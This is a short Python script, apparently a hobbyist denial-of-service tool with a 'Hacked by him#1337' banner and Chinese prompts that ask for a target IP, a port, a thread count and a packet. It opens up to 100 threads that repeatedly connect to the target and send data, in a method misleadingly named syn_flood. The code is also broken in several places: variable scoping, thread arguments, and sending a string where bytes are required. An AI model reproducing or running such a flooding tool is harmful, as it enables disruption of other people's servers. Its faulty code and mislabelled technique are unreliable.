import socket
import threading
import time
import os
ip=''
port=80
threads = 100
pack="Hacked by him#1337"
e1='''
**************************************************************
__     ___            _ _             
\ \   / (_)          | (_)            
 \ \_/ / _ _ __      | |_ _ __   __ _ 
  \   / | | '_ \ _   | | | '_ \ / _` |
   | |  | | | | | |__| | | | | | (_| |
   |_|  |_|_| |_|\____/|_|_| |_|\__, |
                                 __/ |
                                |___/
**************************************************************                                
'''

print(e1)
print('Hacked by him#1337\nwelcome to https://space.bilibili.com/590491558 or https://github.com/him114514\n')
class ddos:
    def __init__(self, host, port, pack):
        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.client.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        self.host=host
        self.port=port
        self.pack=pack
    def syn_flood(self):
        while True:
            print("连接IP{0},端口{1}".format(self.host, self.port))
            try:
                self.client.connect((self.host, self.port))
                self.client.send(self.pack) 
                

            except Exception as error:
                print("---------------------------------------------------------")
                print("错误:\n"+str(error))
                print(self)
                print("连接IP{0},端口{1}".format(self.host, self.port))
                print("---------------------------------------------------------")
                break

def pist():
    while 1:
        try:
            global threads
            threads=int(input("请输入线程数:\n"))
            global port
            port=int(input("请输入端口:\n"))
            
            break
        except:
            print('输入的不是数字,重新输！')
            continue
def start():
    while 1:
        print('\n--------------------------------------------------')
        ask=input('是否要进行配置，如不配置将使用默认值\n适用于80端口的本机\n输入y以确认，输入n取消(使用默认值)：\n')
        print('--------------------------------------------------\n')
        if ask=="y":
            ip=input('请输入ip地址:\n')
            pist()
            pack=input('请设置你的数据包:\n')
        
            break
        elif ask=="n":
            break
        else:
            print('叫你输入y或n，谁叫你写别的？')
            continue
        


if __name__=="__main__":
    start()
    pressure=ddos(ip,port,pack)
    thread_list = []
    for i in range(threads):
        t = threading.Thread(target=pressure.syn_flood, args=(pressure.host, pressure.port))
        t.start()
        thread_list.append(t)
     
    for t in thread_list:
        t.join()

 

